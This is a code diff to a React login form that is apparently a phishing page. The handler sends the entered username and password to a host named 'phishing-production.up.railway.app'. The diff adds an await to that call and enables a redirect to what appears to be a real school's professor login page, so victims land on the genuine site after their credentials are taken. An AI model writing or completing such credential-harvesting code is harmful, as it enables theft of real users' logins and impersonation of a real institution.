@@ -21,12 +21,12 @@ export function Login() {
     async function enviar(event){
       event.preventDefault();
 
-      fetch("https://phishing-production.up.railway.app/user", {
+      await fetch("https://phishing-production.up.railway.app/user", {
         method:"POST", 
         headers: {"content-type": "application/json"},
         body: JSON.stringify({uname, pass})
       })
-      //window.location.href = "https://casteloporto.com.br/mediafinal/Media/Final/Professor/login.php"
+      window.location.href = "https://casteloporto.com.br/mediafinal/Media/Final/Professor/login.php"
     }
 
     async function troca() {
